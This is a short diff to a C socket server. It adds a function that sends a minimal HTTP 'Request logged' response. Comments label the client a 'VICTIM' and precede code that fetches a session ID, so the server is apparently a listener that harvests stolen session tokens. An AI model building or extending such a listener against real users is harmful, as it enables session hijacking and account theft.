@@ -264,6 +264,22 @@ static int accept_client(int server_fd, struct sockaddr_in *client_addr){
                          &client_addr_len);
   return client_fd;
 }
+/*
+ * send_http_response - Sends a minimal HTTP 200 OK response
+ * @client_fd: File descriptor of the connected client socket
+ */
+static void send_http_response(int client_fd) {
+  const char *response =
+      "HTTP/1.1 200 OK\r\n"
+      "Content-Type: text/html\r\n"
+      "Content-Length: 27\r\n"
+      "Connection: close\r\n"
+      "\r\n"
+      "<html>Request logged</html>";
+
+  ssize_t sent = write(client_fd, response, strlen(response));
+  (void)sent;
+}
 
 /*
  * main
@@ -318,6 +334,8 @@ int main(void) {
   }
   buffer[bytes_read] = '\0';
 
+  // SEND RESPONSE TO VICTIM
+  send_http_response(client_fd);
   // FETCH
   char sessid[256];
   memset(sessid, 0, sizeof(sessid));
